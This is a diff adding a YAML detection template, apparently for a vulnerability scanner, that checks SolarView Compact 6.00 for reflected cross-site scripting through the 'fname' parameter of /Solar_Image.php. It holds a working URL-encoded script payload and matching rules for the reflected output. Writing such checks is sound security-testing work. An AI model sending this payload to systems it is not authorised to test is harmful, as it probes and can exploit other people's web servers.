@@ -1,0 +1,30 @@
+id: solarview-compact-xss
+brief:
+    title: SolarView Compact 6.00 - Cross-Site Scripting
+    by: ritikchaddha
+    level: high
+    about: SolarView Compact 6.00 contains a cross-site scripting vulnerability via fname at /Solar_Image.php.
+    label:
+        - xss
+        - solarview
+        - edb
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/Solar_Image.php?mode=resize&fname=test%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+      signs:
+        - "on": word
+          has:
+            - value="test"><script>alert(document.domain)</script>">
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
